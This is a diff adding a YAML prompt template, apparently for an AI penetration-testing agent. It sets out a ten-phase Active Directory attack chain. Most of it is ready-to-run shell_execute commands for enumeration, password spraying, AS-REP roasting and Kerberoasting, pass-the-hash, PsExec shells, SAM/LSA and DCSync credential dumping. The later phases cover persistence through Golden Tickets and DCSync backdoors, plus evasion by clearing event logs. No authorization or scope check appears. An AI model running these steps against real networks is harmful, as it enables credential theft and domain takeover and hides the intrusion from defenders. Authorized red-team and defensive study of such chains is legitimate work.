@@ -1,0 +1,122 @@
+id: ad-domain-attack
+name: AD 域渗透完整攻击链
+description: Active Directory 域环境从信息收集到域控的完整攻击路径
+category: 横向移动
+tags: [ad, domain, kerberos, lateral, privilege-escalation, dcsync]
+difficulty: hard
+icon: "🏰"
+step_count: 10
+variables:
+  - name: domain
+    label: 域名
+    placeholder: corp.local
+    required: true
+  - name: dc_ip
+    label: 域控 IP
+    placeholder: 192.168.1.1
+    required: true
+prompt: |
+  # AD 域渗透完整攻击链
+
+  ## Phase 1: 域信息收集
+  ```
+  # DNS 枚举域控
+  shell_execute command="nmap -sV -p 53,88,135,139,389,445,636,3268,3269 {{dc_ip}}"
+  
+  # LDAP 匿名枚举（如允许）
+  shell_execute command="netexec ldap {{dc_ip}} -u '' -p '' --users"
+  shell_execute command="netexec ldap {{dc_ip}} -u '' -p '' --groups"
+  ```
+
+  ## Phase 2: 用户枚举
+  ```
+  # 通过 Kerberos 枚举有效用户（无需凭据）
+  shell_execute command="netexec smb {{dc_ip}} -u users.txt -p '' --users"
+  
+  # 获取用户名字典
+  dict_get category="Auth" name="common-usernames.txt"
+  ```
+
+  ## Phase 3: 密码攻击
+  ```
+  # 密码喷洒（注意锁定策略！先查询密码策略）
+  shell_execute command="netexec smb {{dc_ip}} -u users.txt -p 'Password123!' --continue-on-success"
+  
+  # AS-REP Roasting（不需要预认证的用户）
+  shell_execute command="impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -usersfile users.txt -format hashcat -outputfile asrep.txt"
+  
+  # 使用 hashcat 破解
+  shell_execute command="hashcat -m 18200 asrep.txt dict.txt"
+  ```
+
+  ## Phase 4: Kerberoasting
+  ```
+  # 需要一个有效域用户凭据
+  shell_execute command="impacket-GetUserSPNs {{domain}}/user:password -dc-ip {{dc_ip}} -request -outputfile kerberoast.txt"
+  
+  # 破解 TGS
+  shell_execute command="hashcat -m 13100 kerberoast.txt dict.txt"
+  ```
+
+  ## Phase 5: 横向移动
+  ```
+  # SMB 认证检测（用获取的凭据测试其他机器）
+  shell_execute command="netexec smb 192.168.1.0/24 -u user -p 'password' --continue-on-success"
+  
+  # WinRM 执行
+  shell_execute command="netexec winrm targets.txt -u user -p 'password' -x 'whoami /all'"
+  
+  # Pass-the-Hash
+  shell_execute command="netexec smb {{dc_ip}} -u administrator -H 'NTLM_HASH' --shares"
+  
+  # PsExec 获取 SYSTEM shell
+  shell_execute command="impacket-psexec {{domain}}/admin:password@target 'whoami'"
+  ```
+
+  ## Phase 6: 权限提升路径
+  - **委派攻击**: 查找无约束委派/约束委派/RBCD
+  - **ACL 滥用**: GenericAll/WriteDACL/WriteOwner 权限
+  - **GPO 滥用**: 可修改的组策略
+  - **LAPS**: 读取本地管理员密码
+  ```
+  shell_execute command="netexec ldap {{dc_ip}} -u user -p pass -M laps"
+  ```
+
+  ## Phase 7: 凭据转储
+  ```
+  # SAM 转储（需要本地管理员权限）
+  shell_execute command="netexec smb target -u admin -p pass --sam"
+  
+  # LSA Secrets
+  shell_execute command="netexec smb target -u admin -p pass --lsa"
+  
+  # DCSync（需要域管或特定权限）
+  shell_execute command="impacket-secretsdump {{domain}}/admin:pass@{{dc_ip}} -just-dc"
+  
+  # NTDS.dit 转储
+  shell_execute command="impacket-secretsdump {{domain}}/admin:pass@{{dc_ip}} -just-dc -outputfile ntds_dump"
+  ```
+
+  ## Phase 8: 持久化
+  - **Golden Ticket**: 需要 krbtgt NTLM hash
+  - **Silver Ticket**: 需要服务账户 NTLM hash
+  - **DCSync 后门**: 给普通用户添加 DCSync 权限
+  - **AdminSDHolder**: 滥用 AdminSDHolder 保护机制
+
+  ## Phase 9: 防御规避
+  - 使用 PTH 代替明文密码
+  - 避免触发蜜罐账户
+  - 注意 Kerberos 票据有效期
+  - 清理事件日志
+
+  ## Phase 10: 报告
+  记录: 攻击路径图、获取的凭据清单、域信任关系、关键漏洞
+
+  ## 关键工具映射
+  | 阶段 | 工具 |
+  |------|------|
+  | 枚举 | netexec, nmap, shell_execute |
+  | Kerberos | impacket-GetNPUsers, impacket-GetUserSPNs |
+  | 横向移动 | netexec, impacket-psexec |
+  | 凭据转储 | impacket-secretsdump, netexec --sam/--lsa |
+  | 密码破解 | hashcat, john |
